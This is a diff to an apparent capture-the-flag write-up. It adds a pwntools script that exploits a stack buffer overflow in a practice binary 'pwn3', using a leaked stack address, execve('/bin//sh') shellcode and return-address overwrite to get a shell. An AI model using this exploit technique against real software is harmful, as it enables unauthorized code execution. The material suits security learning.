@@ -25,3 +25,36 @@ Looking at the stack layout in Ghidra, there doesn't really look like there is a
        
 ```
 
+```
+from pwn import *
+
+# Start the process
+target = process('./pwn3')
+
+# Print out the text, up to the address of the start of our input
+print(target.recvuntil(b"journey ").decode())
+
+# Read the next line and decode to string
+leak = target.recvline().decode()
+
+# Strip away characters not part of the address and convert from hex string to int
+shellcodeAdr = int(leak.strip("!\n"), 16)
+
+# Shellcode from: http://shell-storm.org/shellcode/files/shellcode-827.php
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68" \
+            b"\x68\x2f\x62\x69\x6e\x89\xe3\x50" \
+            b"\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+# Pad the payload with null bytes to reach return address offset
+payload = shellcode.ljust(0x12e, b"\x00")
+
+# Append the leaked return address pointing to shellcode
+payload += p32(shellcodeAdr)
+
+# Send the payload
+target.sendline(payload)
+
+# Get an interactive shell
+target.interactive()
+
+```
